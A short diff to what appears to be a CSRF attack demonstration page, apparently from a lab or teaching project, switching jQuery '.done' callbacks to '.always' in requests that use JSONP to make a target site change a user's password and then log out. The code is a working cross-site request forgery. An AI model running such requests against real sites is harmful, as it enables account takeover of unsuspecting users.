@@ -18,7 +18,7 @@
                     password : 'toto'
                 }
             })
-            .done(function(res) {
+            .always(function(res) {
                 $.ajax({
                     url : '<?php echo $target_site?>/CSRF-Attack/logout',
 					dataType : 'jsonp'
@@ -30,7 +30,7 @@
                 url : '<?php echo $target_site?>/change/password/level2?pwd=<?php echo $new_password?>',
 				dataType : 'jsonp'
             })
-            .done(function(res) {
+            .always(function(res) {
                 $.ajax({
                     url : '<?php echo $target_site?>/CSRF-Attack/logout',
 					dataType : 'jsonp'
